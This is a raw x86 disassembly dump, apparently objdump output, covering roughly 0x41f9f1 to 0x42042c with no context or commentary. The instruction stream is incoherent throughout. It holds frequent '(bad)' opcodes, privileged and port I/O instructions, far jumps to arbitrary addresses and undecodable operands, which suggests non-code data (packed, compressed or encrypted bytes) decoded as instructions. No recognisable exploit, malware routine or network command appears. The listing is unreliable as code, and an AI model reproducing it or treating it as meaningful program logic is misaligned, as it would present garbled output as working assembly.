  41f9f1:	cmp    ch,al
  41f9f3:	(bad)  
  41f9f4:	out    0x14,al
  41f9f6:	jno    0x41f9c0
  41f9f8:	std    
  41f9f9:	ret    
  41f9fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9fc:	pop    ebx
  41f9fd:	adc    DWORD PTR [ebx+ecx*4-0x1f49345e],eax
  41fa04:	adc    BYTE PTR [esi],al
  41fa06:	or     al,0x34
  41fa08:	sbb    eax,0xc5a97fe
  41fa0d:	jns    0x41f9b8
  41fa0f:	pushf  
  41fa10:	test   DWORD PTR [eax],eax
	...
  41fa72:	add    BYTE PTR [eax],al
  41fa74:	or     al,BYTE PTR [ecx-0x49]
  41fa77:	mov    eax,ds:0xeb1ef7ff
  41fa7c:	and    edx,DWORD PTR [edi-0x5d]
  41fa7f:	adc    eax,0x8e62b8b4
  41fa84:	dec    ebp
  41fa85:	push   ecx
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    eax,0x5b000001
  41fa8d:	scas   al,BYTE PTR es:[edi]
  41fa8e:	test   BYTE PTR [edx+0x47e8266d],dh
  41fa94:	rol    BYTE PTR [edx],0x46
  41fa97:	fisub  DWORD PTR [esi+0x68]
  41fa9a:	loope  0x41fad2
  41fa9c:	jmp    0x63abe3ce
  41faa1:	outs   dx,DWORD PTR ds:[esi]
  41faa2:	imul   bh
  41faa4:	push   ecx
  41faa5:	scas   al,BYTE PTR es:[edi]
  41faa6:	push   eax
  41faa7:	outs   dx,DWORD PTR ds:[esi]
  41faa8:	push   edx
  41faa9:	add    dl,dl
  41faab:	adc    dh,dh
  41faad:	xor    al,0x3d
  41faaf:	loopne 0x41fb2d
  41fab1:	sbb    eax,0xaf0885e1
  41fab6:	aam    0xc9
  41fab8:	mov    WORD PTR [eax+0x39],gs
  41fabb:	pop    ecx
  41fabc:	inc    ebx
  41fabd:	pop    ss
  41fabe:	xor    ch,ch
  41fac0:	xchg   ebx,eax
  41fac1:	(bad)  
  41fac2:	and    ecx,edi
  41fac4:	retf   0x6740
  41fac7:	lods   al,BYTE PTR ds:[esi]
  41fac8:	jmp    0xaa44:0x8089ac8f
  41facf:	inc    ecx
  41fad0:	shl    DWORD PTR [esi-0xa],0xf9
  41fad4:	xor    dh,BYTE PTR [eax+0x4e]
  41fad7:	pop    ds
  41fad8:	sbb    DWORD PTR [edi-0x4a2abf6c],esi
  41fade:	mov    ds:0x3a1efe11,eax
  41fae3:	mov    dl,0xaf
  41fae5:	mov    al,0xfe
  41fae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fae8:	inc    edi
  41fae9:	fnstcw WORD PTR [esi+0x4f]
  41faec:	retf   
  41faed:	loopne 0x41fad6
  41faef:	jmp    0x8341:0x49dd7691
  41faf6:	lds    edi,FWORD PTR ss:[eax-0x31]
  41fafa:	mov    al,0xb8
  41fafc:	ret    
  41fafd:	fidivr WORD PTR [ebp+0x17845ed2]
  41fb03:	lods   al,BYTE PTR ds:[esi]
  41fb04:	mov    eax,0x4e0271e1
  41fb09:	ficom  WORD PTR [edi+0xb8c3a8a]
  41fb0f:	data16 or al,ah
  41fb12:	in     eax,dx
  41fb13:	out    dx,al
  41fb14:	addr16 imul edx
  41fb17:	ds mov edx,0xcc5d97fa
  41fb1d:	ss adc al,0x1a
  41fb20:	dec    ecx
  41fb21:	retf   
  41fb22:	or     eax,0x670cc78
  41fb27:	ins    BYTE PTR es:[edi],dx
  41fb28:	mov    WORD PTR [si+0x74],cs
  41fb2c:	and    ch,BYTE PTR [ebp+0x55]
  41fb2f:	aaa    
  41fb30:	pop    esi
  41fb31:	push   esi
  41fb32:	push   ds
  41fb33:	dec    ebx
  41fb34:	cdq    
  41fb35:	or     al,al
  41fb37:	push   ebp
  41fb38:	push   esi
  41fb39:	cmp    DWORD PTR [edx+0x4542ad96],edi
  41fb3f:	hlt    
  41fb40:	and    DWORD PTR [edx-0x574f41b9],ebp
  41fb46:	pushf  
  41fb47:	push   esp
  41fb48:	push   eax
  41fb49:	sub    BYTE PTR [ebx-0x7d491c0],bh
  41fb4f:	push   edi
  41fb50:	push   ebp
  41fb51:	adc    ebp,DWORD PTR [edx-0x19]
  41fb54:	iret   
  41fb55:	stc    
  41fb56:	enter  0x2412,0x5e
  41fb5a:	xchg   DWORD PTR [ebx],ebx
  41fb5c:	inc    ecx
  41fb5d:	imul   edx,DWORD PTR [ebx-0x4e7a7b22],0xb2a01641
  41fb67:	and    eax,0x61e8b8ad
  41fb6c:	xchg   edi,eax
  41fb6d:	aad    0x42
  41fb6f:	jo     0x41fb53
  41fb71:	jle    0x41faf5
  41fb73:	cmp    edi,edi
  41fb75:	mov    ebx,0xd0f4a701
  41fb7a:	and    al,0x8b
  41fb7c:	vdivps xmm0,xmm1,XMMWORD PTR [ecx+0x3d]
  41fb81:	jnp    0x41fbfa
  41fb83:	call   0x6180a0ba
  41fb88:	daa    
  41fb89:	mov    dh,dh
  41fb8b:	(bad)  
  41fb8c:	in     eax,dx
  41fb8d:	adc    ebx,DWORD PTR [ecx+0x17]
  41fb90:	retf   
	...
  41fbf1:	add    BYTE PTR [eax],al
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	ds mov ebp,0x52525343
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    eax,0xa8000001
  41fc0d:	xchg   ecx,eax
  41fc0e:	push   esi
  41fc0f:	stos   DWORD PTR es:[edi],eax
  41fc10:	test   eax,ecx
  41fc12:	jp     0x41fbcf
  41fc14:	sub    BYTE PTR [ecx],cl
  41fc16:	fdivp  st(1),st
  41fc18:	test   DWORD PTR [edi],0x81114f40
  41fc1e:	das    
  41fc1f:	gs jg  0x41fc41
  41fc22:	push   esp
  41fc23:	mov    DWORD PTR [ebp-0x66680624],edx
  41fc29:	jno    0x41fbc4
  41fc2b:	add    DWORD PTR [ebx-0x75d5ca0],esi
  41fc31:	push   ebx
  41fc32:	push   ds
  41fc33:	int3   
  41fc34:	mov    edx,0xec7dba01
  41fc39:	mov    WORD PTR [edx+ebp*1-0x1053ee88],cs
  41fc40:	add    eax,0xc14f4981
  41fc45:	cs mov esp,0x393000d6
  41fc4b:	jmp    FWORD PTR [edi]
  41fc4d:	or     edi,edx
  41fc4f:	mov    ecx,0xdf6e0efe
  41fc54:	cwde   
  41fc55:	sbb    ebx,edx
  41fc57:	fld    QWORD PTR [ebp-0x59667f89]
  41fc5d:	les    ecx,FWORD PTR [eax+0x6e]
  41fc60:	push   ebx
  41fc61:	jnp    0x41fc46
  41fc63:	jae    0x41fc88
  41fc65:	add    BYTE PTR [edi+0x96f0dd4],al
  41fc6b:	adc    DWORD PTR ds:0x6cff49ba,edx
  41fc71:	mov    es,edx
  41fc73:	mov    WORD PTR [eax],fs
  41fc75:	and    ecx,edi
  41fc77:	jae    0x41fbfa
  41fc79:	xchg   esi,eax
  41fc7a:	pusha  
  41fc7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc7c:	jmp    0xfbcc895a
  41fc81:	mov    ebx,0xcbff9493
  41fc86:	ins    BYTE PTR es:[edi],dx
  41fc87:	(bad)  
  41fc88:	pusha  
  41fc89:	xor    eax,0x75bb8ecc
  41fc8e:	lods   al,BYTE PTR ds:[esi]
  41fc8f:	lahf   
  41fc90:	jno    0x41fc35
  41fc92:	push   edi
  41fc93:	xchg   edx,eax
  41fc94:	lahf   
  41fc95:	jg     0x41fc54
  41fc97:	fiadd  DWORD PTR [edi]
  41fc99:	cmp    eax,0xa8a4d187
  41fc9e:	test   DWORD PTR [ebx],0xb5981aea
  41fca4:	aam    0xb9
  41fca6:	test   eax,0xded0b58d
  41fcab:	mov    es,WORD PTR [ecx+0x4e585519]
  41fcb1:	xchg   esi,eax
  41fcb2:	sbb    edx,esi
  41fcb4:	sbb    cl,dh
  41fcb6:	push   edx
  41fcb7:	mov    bh,0xb0
  41fcb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcba:	mov    DWORD PTR ds:0x13a0f173,edi
  41fcc0:	sbb    DWORD PTR [esi+ecx*1-0x728ea7e3],ecx
  41fcc7:	test   eax,0x63295382
  41fccc:	mov    eax,ds:0xbc79fa0f
  41fcd1:	or     eax,0x46
  41fcd4:	adc    bh,ch
  41fcd6:	xchg   BYTE PTR [edi],cl
  41fcd8:	leave  
  41fcd9:	mov    ecx,0x48311488
  41fcde:	sub    edi,DWORD PTR [esi]
  41fce0:	cld    
  41fce1:	and    DWORD PTR [ecx-0x8],edi
  41fce4:	imul   edi,DWORD PTR [edx],0xffffffd1
  41fce7:	push   edx
  41fce8:	sub    BYTE PTR [edi-0xb],0x9f
  41fcec:	daa    
  41fced:	in     eax,0x94
  41fcef:	and    edx,esi
  41fcf1:	fcmovu st,st(2)
  41fcf3:	arpl   WORD PTR [ebx+ecx*1-0x28966ae5],bp
  41fcfa:	inc    DWORD PTR [edx-0x13]
  41fcfd:	mov    BYTE PTR [esi],dh
  41fcff:	jge    0x41fd3e
  41fd01:	cs dec ebp
  41fd03:	clc    
  41fd04:	sub    esi,eax
  41fd06:	mov    bh,0x80
  41fd08:	and    edx,DWORD PTR ds:0x537fe925
  41fd0e:	sbb    eax,0xe017
	...
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	mov    WORD PTR [edi+eax*1+0x1535714],es
  41fd87:	add    BYTE PTR ds:0x2d000001,al
  41fd8d:	test   BYTE PTR [esi-0x41f5a227],ch
  41fd93:	das    
  41fd94:	and    eax,0xf661a7cc
  41fd99:	add    esi,DWORD PTR ds:[edi+eax*1]
  41fd9d:	push   eax
  41fd9e:	jp     0x41fe1b
  41fda0:	in     eax,dx
  41fda1:	inc    edx
  41fda2:	in     eax,0x3e
  41fda4:	lods   al,BYTE PTR ds:[esi]
  41fda5:	and    edx,esi
  41fda7:	and    eax,0xb0534808
  41fdac:	mov    ebp,0x5dfe3ace
  41fdb1:	jns    0x41fdf3
  41fdb3:	inc    edi
  41fdb4:	fidivr WORD PTR [esi]
  41fdb6:	je     0x41fd7c
  41fdb8:	mov    ecx,0xcc9f9d98
  41fdbd:	cmp    BYTE PTR [ebx+ebp*8-0x6a],cl
  41fdc1:	sar    BYTE PTR [eax-0x6d154e89],cl
  41fdc7:	sub    DWORD PTR [eax-0x12bc0bf3],ecx
  41fdcd:	mov    WORD PTR [ebp+0x9dae170],?
  41fdd3:	pop    edx
  41fdd4:	mov    ecx,0xd0429a43
  41fdd9:	mov    ds:0xd2bab765,al
  41fdde:	js     0x41fdc0
  41fde0:	jmp    0x41fd7f
  41fde2:	lods   eax,DWORD PTR ds:[esi]
  41fde3:	add    ebp,DWORD PTR [eax+0x130b852f]
  41fde9:	fisubr DWORD PTR [ebx]
  41fdeb:	jns    0x41fe5b
  41fded:	mov    ebp,0xe4d6b41
  41fdf2:	pop    edx
  41fdf3:	or     al,0xc1
  41fdf5:	rep stos BYTE PTR es:[edi],al
  41fdf7:	adc    BYTE PTR [esi-0x7fdc0a53],bh
  41fdfd:	(bad)  
  41fdfe:	imul   ecx,DWORD PTR [esi+0x7f44e286],0xc
  41fe05:	dec    ebp
  41fe06:	fld    QWORD PTR [ebp-0x8]
  41fe09:	rcr    BYTE PTR [ebx-0x50c323b0],0xd8
  41fe10:	sub    al,0x1d
  41fe12:	sub    eax,0xfcb76dd2
  41fe17:	sub    eax,0xfc0a26de
  41fe1c:	out    dx,al
  41fe1d:	lock ret 0xaca5
  41fe21:	fs pop edx
  41fe23:	inc    ecx
  41fe24:	and    DWORD PTR [edi+eiz*4-0x58],ebp
  41fe28:	in     eax,0x65
  41fe2a:	xor    BYTE PTR [ebp-0x7182e4d],bh
  41fe30:	sysret 
  41fe32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe33:	es cld 
  41fe35:	js     0x41fe6e
  41fe37:	stc    
  41fe38:	shl    BYTE PTR [eax],cl
  41fe3a:	add    BYTE PTR [ebx-0x30059a2a],ch
  41fe40:	pop    ebp
  41fe41:	and    eax,0xf29065c9
  41fe46:	ins    BYTE PTR es:[edi],dx
  41fe47:	cwde   
  41fe48:	mov    al,ds:0x2c005b3
  41fe4d:	dec    eax
  41fe4e:	mov    eax,0x89d74e70
  41fe53:	add    edi,DWORD PTR [ecx-0x2a]
  41fe56:	xor    ah,0xe1
  41fe59:	add    edi,DWORD PTR [ebx-0x23]
  41fe5c:	adc    ch,ch
  41fe5e:	sbb    BYTE PTR [edx],ah
  41fe60:	mov    al,ds:0x87e3d976
  41fe65:	sbb    al,0x92
  41fe67:	mov    dl,dh
  41fe69:	pop    ss
  41fe6a:	dec    ebp
  41fe6b:	dec    ebp
  41fe6c:	int    0xd
  41fe6e:	push   ds
  41fe6f:	xor    edx,DWORD PTR ds:0x386a944
  41fe75:	(bad)  
  41fe76:	mov    ?,WORD PTR [ebx-0x31508c1f]
  41fe7c:	push   ss
  41fe7d:	rcr    BYTE PTR [edx+edi*2+0x72],cl
  41fe81:	cmp    eax,0xccc9613c
  41fe86:	jb     0x41fe82
  41fe88:	cwde   
  41fe89:	loopne 0x41fe5f
  41fe8b:	push   es
  41fe8c:	xor    dl,ch
  41fe8e:	and    esi,esp
  41fe90:	mov    DWORD PTR [eax],eax
	...
  41fef2:	add    BYTE PTR [eax],al
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x57
  41ff01:	fisubr WORD PTR [eax+0x1545c4f]
  41ff07:	add    BYTE PTR ds:0x8a000001,al
  41ff0d:	and    bl,ch
  41ff0f:	xor    al,BYTE PTR [ebx-0x58]
  41ff12:	adc    DWORD PTR [ebp+0x777f5394],0xfc130a41
  41ff1c:	rcr    BYTE PTR [ebp-0x135bb097],cl
  41ff22:	dec    esp
  41ff23:	sar    ebp,1
  41ff25:	sbb    esp,DWORD PTR [eax]
  41ff27:	push   edx
  41ff28:	stc    
  41ff29:	adc    eax,0x36b99665
  41ff2e:	scas   al,BYTE PTR es:[edi]
  41ff2f:	jns    0x41ffa6
  41ff31:	les    ebp,FWORD PTR [edi]
  41ff33:	hlt    
  41ff34:	mov    dh,0xae
  41ff36:	(bad)  
  41ff37:	out    dx,eax
  41ff38:	dec    edi
  41ff39:	mov    ecx,0xc1f3041f
  41ff3e:	xor    DWORD PTR [edi+0xc],eax
  41ff41:	jns    0x41ff35
  41ff43:	popf   
  41ff44:	mov    ds:0xb0be36a2,eax
  41ff49:	lods   al,BYTE PTR ds:[esi]
  41ff4a:	mov    ebx,0xb944c795
  41ff4f:	retf   
  41ff50:	out    0xb2,al
  41ff52:	cmp    DWORD PTR [eax],ecx
  41ff54:	push   esp
  41ff55:	xchg   ecx,eax
  41ff56:	add    bh,BYTE PTR ds:0xa1c3ad46
  41ff5c:	or     eax,0x5cf62ffa
  41ff61:	icebp  
  41ff62:	sbb    al,0x8c
  41ff64:	sub    bh,ah
  41ff66:	cmp    al,0x53
  41ff68:	add    eax,0x65da15c2
  41ff6d:	mov    dl,0xb5
  41ff6f:	mov    es,edx
  41ff71:	jmp    0x2a1e:0x7a916e37
  41ff78:	(bad)  
  41ff79:	and    al,0x2f
  41ff7b:	bound  ebx,QWORD PTR [ebp+0x2e039587]
  41ff81:	sub    ecx,eax
  41ff83:	xchg   edx,eax
  41ff84:	or     bh,BYTE PTR [eax-0x6f]
  41ff87:	popfw  
  41ff89:	in     al,0x35
  41ff8b:	sub    al,0x4
  41ff8d:	aas    
  41ff8e:	pop    edi
  41ff8f:	xor    DWORD PTR [esi+0x70],0xc4135509
  41ff96:	sub    DWORD PTR [esi],esi
  41ff98:	xor    BYTE PTR [edi+0x10],0xb1
  41ff9c:	in     al,0xa2
  41ff9e:	adc    eax,0xb82a14fb
  41ffa3:	jmp    0x41ff32
  41ffa5:	cmp    esp,edx
  41ffa7:	loop   0x41fff9
  41ffa9:	arpl   WORD PTR [edi-0x4ad3f6ce],si
  41ffaf:	push   es
  41ffb0:	inc    esp
  41ffb1:	pop    edx
  41ffb2:	popf   
  41ffb3:	sub    bh,bl
  41ffb5:	(bad)  
  41ffb6:	sbb    dh,BYTE PTR [ebx+eiz*8]
  41ffb9:	mov    cl,bh
  41ffbb:	mov    dh,0xfc
  41ffbd:	int    0xe4
  41ffbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffc0:	mov    BYTE PTR [ecx+edi*8+0x7d],0xbb
  41ffc5:	mov    ah,0xbe
  41ffc7:	push   esp
  41ffc8:	hlt    
  41ffc9:	cmp    DWORD PTR [edi],edi
  41ffcb:	stc    
  41ffcc:	xchg   BYTE PTR [edx],bh
  41ffce:	rcr    DWORD PTR [ebx+edi*1-0x72],1
  41ffd2:	icebp  
  41ffd3:	sub    ebx,DWORD PTR [ecx]
  41ffd5:	sub    eax,0xc55ac19f
  41ffda:	push   ebp
  41ffdb:	pop    ebp
  41ffdc:	fdiv   st(6),st
  41ffde:	sub    esi,DWORD PTR [ebx-0x3a]
  41ffe1:	stc    
  41ffe2:	bound  ebp,QWORD PTR ds:0xc367f926
  41ffe8:	mov    esi,0xe55add78
  41ffed:	jge    0x420026
  41ffef:	push   eax
  41fff0:	retf   
  41fff1:	aad    0x61
  41fff3:	cmp    edi,DWORD PTR [ebp+0x51b4e8f]
  41fff9:	dec    esi
  41fffa:	sbb    BYTE PTR [ecx],ch
  41fffc:	bound  esi,QWORD PTR [edi-0x31]
  41ffff:	sahf   
  420000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420001:	and    ch,BYTE PTR [eax]
  420003:	adc    eax,0x914e54fd
  420008:	xchg   edx,eax
  420009:	dec    ebx
  42000a:	add    BYTE PTR [eax+0x6],dl
  42000d:	call   0x4f5a1d
	...
  420072:	add    BYTE PTR [eax],al
  420074:	bound  esp,QWORD PTR [ebp-0x8808a]
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffffcf
  420081:	pop    esp
  420082:	pop    edx
  420083:	test   BYTE PTR [ecx+0x55],ah
  420086:	add    DWORD PTR [eax],eax
  420088:	add    eax,0x93000001
  42008d:	pop    ebp
  42008e:	call   0x5e0f:0x782b02e2
  420095:	cs into 
  420097:	pop    edi
  420098:	adc    esi,DWORD PTR [edi-0x41]
  42009b:	push   edi
  42009c:	sbb    DWORD PTR [ebp-0x4e48127f],edi
  4200a2:	aad    0x58
  4200a4:	mov    cl,0x39
  4200a6:	sub    bh,cl
  4200a8:	jno    0x420098
  4200aa:	sub    dl,al
  4200ac:	sbb    BYTE PTR [ebx-0x48e2d161],bh
  4200b2:	iret   
  4200b3:	jecxz  0x4200f7
  4200b5:	pop    ebx
  4200b6:	enter  0xb300,0xc5
  4200ba:	and    eax,0xf30fba02
  4200bf:	xor    DWORD PTR ds:0x76c2a639,edi
  4200c5:	gs xor al,0xcb
  4200c8:	mov    esp,0x354eb6e7
  4200cd:	fs mov dh,0x1
  4200d0:	lahf   
  4200d1:	sub    esp,edi
  4200d3:	mov    es,WORD PTR [esi]
  4200d5:	jbe    0x4200ba
  4200d7:	cld    
  4200d8:	jle    0x4200e6
  4200da:	jae    0x4200aa
  4200dc:	xor    ecx,DWORD PTR [edi]
  4200de:	push   ebx
  4200df:	inc    DWORD PTR [eax+edi*1+0x4cdd1627]
  4200e6:	fidivr WORD PTR [edx]
  4200e8:	clc    
  4200e9:	jmp    0x420081
  4200eb:	jo     0x4200e1
  4200ed:	shl    DWORD PTR [eax-0x12],cl
  4200f0:	out    dx,al
  4200f1:	test   ah,dl
  4200f3:	pop    ebp
  4200f4:	xor    ah,BYTE PTR [eax+0x7f86f122]
  4200fa:	(bad)  
  4200fb:	es push es
  4200fd:	cmp    ebx,eax
  4200ff:	hlt    
  420100:	cli    
  420101:	inc    esp
  420102:	jns    0x4200ce
  420104:	enter  0xa5a7,0x98
  420108:	cmp    al,0xd2
  42010a:	pop    ecx
  42010b:	push   eax
  42010c:	dec    edi
  42010d:	mov    ebp,DWORD PTR [ebx-0x7b180b2f]
  420113:	pusha  
  420114:	fs mov esp,0xdb074020
  42011a:	xor    al,0x3e
  42011c:	je     0x420128
  42011e:	adc    edi,ebp
  420120:	loope  0x420129
  420122:	mov    dh,0x25
  420124:	dec    edx
  420125:	dec    edi
  420126:	int    0xdd
  420128:	push   esi
  420129:	in     eax,dx
  42012a:	jmp    0xf7d0bd31
  42012f:	sbb    DWORD PTR [ecx],esi
  420131:	test   eax,0xdaf20fe2
  420136:	fimul  DWORD PTR [edi]
  420138:	fmul   st(4),st
  42013a:	(bad)  
  42013b:	mov    ah,ch
  42013d:	pop    edx
  42013e:	add    bh,BYTE PTR [ecx]
  420140:	ins    BYTE PTR es:[edi],dx
  420141:	or     eax,DWORD PTR [edi+ebp*8]
  420144:	in     al,dx
  420145:	jmp    0x4200f7
  420147:	push   0xffffffdf
  420149:	jg     0x420197
  42014b:	adc    bl,BYTE PTR [esi]
  42014d:	rcr    BYTE PTR [eax+0x4b01a0ad],cl
  420153:	and    cl,bh
  420155:	scas   eax,DWORD PTR es:[edi]
  420156:	pop    esi
  420157:	sbb    al,0xc
  420159:	inc    esi
  42015a:	les    edx,FWORD PTR [eax-0xf2ce0d6]
  420160:	(bad)  
  420161:	cmc    
  420162:	aam    0x9b
  420164:	xlat   BYTE PTR ds:[ebx]
  420165:	std    
  420166:	jbe    0x42017f
  420168:	pop    ebx
  420169:	popf   
  42016a:	call   0x7cfb:0xf4affddc
  420171:	push   ebx
  420172:	cdq    
  420173:	js     0x420112
  420175:	adc    ah,BYTE PTR [esi-0x8073853]
  42017b:	out    0xe,al
  42017d:	(bad)  
  42017f:	jl     0x4201a6
  420181:	push   ebp
  420182:	push   edx
  420183:	cs dec esi
  420185:	pop    DWORD PTR [ebx+0x528badc4]
  42018b:	jns    0x420129
  42018d:	xor    ah,BYTE PTR [esi]
  42018f:	int3   
  420190:	xchg   ecx,eax
	...
  4201f1:	add    BYTE PTR [eax],al
  4201f3:	add    BYTE PTR [ebx-0x31],dh
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx+0x561e0aa6],1
  420204:	push   si
  420206:	add    DWORD PTR [eax],eax
  420208:	add    eax,0xb4000001
  42020d:	cmp    ecx,DWORD PTR [ecx+0x8]
  420210:	push   ss
  420211:	add    eax,0x1ced159a
  420216:	retf   
  420217:	in     eax,0x61
  420219:	xchg   DWORD PTR [edi+0x64],ecx
  42021c:	and    al,0x9a
  42021e:	(bad)  
  420220:	je     0x4201f4
  420222:	cmp    BYTE PTR [edx+0x18],bh
  420225:	adc    al,0xdb
  420227:	in     eax,dx
  420228:	pop    ebp
  420229:	jbe    0x4202a9
  42022b:	push   ds
  42022c:	add    ebp,DWORD PTR [edx]
  42022e:	inc    BYTE PTR [eax+0x18]
  420231:	dec    esi
  420232:	es popf 
  420234:	cmp    bl,ah
  420236:	fnstcw WORD PTR [ecx+0x42]
  420239:	jae    0x4201ca
  42023b:	retf   
  42023c:	jne    0x420231
  42023e:	out    dx,al
  42023f:	jnp    0x4202a2
  420241:	leave  
  420242:	xor    edx,DWORD PTR [edx+0x4fd2c3a4]
  420248:	test   eax,0x39370f0c
  42024d:	test   al,0xe9
  42024f:	mov    bh,dh
  420251:	inc    ebx
  420252:	mov    bl,0xa8
  420254:	add    ebx,DWORD PTR [esp+eiz*8-0xfa57099]
  42025b:	pop    ebx
  42025c:	stos   DWORD PTR es:[edi],eax
  42025d:	mov    ebp,0x89880dc2
  420262:	cmp    edx,edx
  420264:	inc    ecx
  420265:	pop    ss
  420266:	aas    
  420267:	jo     0x4202c0
  420269:	sbb    bl,BYTE PTR [edi]
  42026b:	repnz call 0x92e7:0x7d4bdb1e
  420273:	lods   eax,DWORD PTR ds:[esi]
  420274:	xor    bl,BYTE PTR [ebx+0x21d7038]
  42027a:	cmp    ah,bl
  42027c:	dec    ecx
  42027d:	dec    esp
  42027e:	out    0x70,eax
  420280:	xor    al,0x2
  420282:	aas    
  420283:	pop    ebp
  420284:	scas   al,BYTE PTR es:[edi]
  420285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420286:	ins    DWORD PTR es:[edi],dx
  420287:	inc    al
  420289:	js     0x420284
  42028b:	fsubr  QWORD PTR [ebx]
  42028d:	add    BYTE PTR [eax-0x38],dh
  420290:	mov    dl,0xad
  420292:	icebp  
  420293:	jl     0x420233
  420295:	xchg   BYTE PTR [edx],cl
  420297:	inc    ebp
  420298:	popa   
  420299:	add    al,0x4e
  42029b:	push   edi
  42029c:	shl    esp,cl
  42029e:	push   edi
  42029f:	in     al,dx
  4202a0:	pop    ebx
  4202a1:	outs   dx,BYTE PTR ds:[esi]
  4202a2:	xor    al,0x8d
  4202a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202a5:	ja     0x42025e
  4202a7:	xchg   ebp,eax
  4202a8:	in     eax,dx
  4202a9:	shr    BYTE PTR [ebp+0x5fe9c92],cl
  4202af:	cmc    
  4202b0:	lock iret 
  4202b2:	scas   eax,DWORD PTR es:[edi]
  4202b3:	(bad)  
  4202b4:	dec    edi
  4202b5:	ficom  DWORD PTR [ecx]
  4202b7:	iret   
  4202b8:	xor    BYTE PTR [edi+0x32eec29f],0xb2
  4202bf:	sti    
  4202c0:	iret   
  4202c1:	stc    
  4202c2:	call   0x7d12:0xacf3114e
  4202c9:	xor    dl,BYTE PTR [ecx]
  4202cb:	add    DWORD PTR [eax-0xa92f8d1],esp
  4202d1:	xor    ebp,DWORD PTR [ebx-0x7f]
  4202d4:	jo     0x4202b1
  4202d6:	xor    al,0x50
  4202d8:	mov    ch,0x6f
  4202da:	aad    0x7e
  4202dc:	arpl   WORD PTR [ebp+0x53a7b364],bp
  4202e2:	inc    ebx
  4202e3:	sub    al,0x85
  4202e5:	shr    edi,1
  4202e7:	repz jmp 0xde7a:0x4045e52
  4202ef:	retf   
  4202f0:	add    esp,DWORD PTR [edi+0x250d4313]
  4202f6:	push   esi
  4202f7:	mov    ecx,0x10fcdbef
  4202fc:	and    al,0x34
  4202fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202ff:	pop    ss
  420300:	xchg   edx,eax
  420301:	outs   dx,DWORD PTR ds:[esi]
  420302:	iret   
  420303:	sahf   
  420304:	push   ds
  420305:	mov    esp,0xac355bc3
  42030a:	ja     0x420336
  42030c:	lods   al,BYTE PTR ds:[esi]
  42030d:	aad    0x18
  42030f:	sbb    BYTE PTR [ebx+0x0],dl
	...
  420371:	add    BYTE PTR [eax],al
  420373:	add    BYTE PTR [ecx+0x6],al
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	add    eax,0x6bb0d388
  420385:	push   edi
  420386:	add    DWORD PTR [eax],eax
  420388:	add    eax,0xe6000001
  42038d:	das    
  42038e:	repnz loope 0x4203fc
  420391:	and    ebx,DWORD PTR [ecx]
  420393:	aas    
  420394:	xchg   BYTE PTR [edi-0x17],ch
  420397:	sub    DWORD PTR [edi+0x17],0xb
  42039b:	cli    
  42039c:	je     0x4203f3
  42039e:	push   es
  42039f:	test   dl,bh
  4203a1:	ins    BYTE PTR es:[edi],dx
  4203a2:	loopne 0x4203f2
  4203a4:	stc    
  4203a5:	std    
  4203a6:	mov    ebp,0x1dbf3f19
  4203ab:	push   ecx
  4203ac:	pushf  
  4203ad:	sub    BYTE PTR [ecx-0x42],ah
  4203b0:	cmp    BYTE PTR [ecx],al
  4203b2:	push   edi
  4203b3:	inc    ebx
  4203b4:	fnsave [eax-0x86f8baa]
  4203ba:	sub    BYTE PTR [ecx-0x7c],cl
  4203bd:	pop    ds
  4203be:	pop    es
  4203bf:	js     0x42036d
  4203c1:	pop    eax
  4203c2:	sub    eax,0xd0d0d0c1
  4203c7:	and    eax,0xac798e68
  4203cc:	jge    0x4203be
  4203ce:	inc    esi
  4203cf:	addr16 enter 0x3080,0xbc
  4203d4:	jmp    0xdb52a350
  4203d9:	call   0xd0ec0ec0
  4203de:	or     BYTE PTR [ecx+0x7a],0xd
  4203e2:	pop    es
  4203e3:	jns    0x420458
  4203e5:	lock jno 0x420446
  4203e8:	dec    esp
  4203e9:	loopne 0x4203c8
  4203eb:	cmp    BYTE PTR [esi-0x29],bh
  4203ee:	(bad)  
  4203f0:	cdq    
  4203f1:	in     al,0x98
  4203f3:	add    ch,ch
  4203f5:	cmp    DWORD PTR [edx-0x1f],0x38
  4203f9:	push   cs
  4203fa:	in     al,0x19
  4203fc:	mov    cl,0xc4
  4203fe:	fwait
  4203ff:	mov    ds:0xb2870d7,eax
  420404:	fimul  DWORD PTR ds:0x9f47138d
  42040a:	gs and ch,bh
  42040d:	jb     0x4203ef
  42040f:	sahf   
  420410:	pop    ds
  420411:	cmp    al,0x8f
  420413:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420414:	(bad)  
  420415:	repz xor al,0x81
  420418:	nop
  420419:	das    
  42041a:	(bad)  
  42041c:	jmp    0x931c:0x1bccf217
  420423:	mov    bh,ah
  420425:	and    eax,0x45f9636c
  42042a:	das    
  42042b:	xlat   BYTE PTR ds:[ebx]
  42042c:	retf   
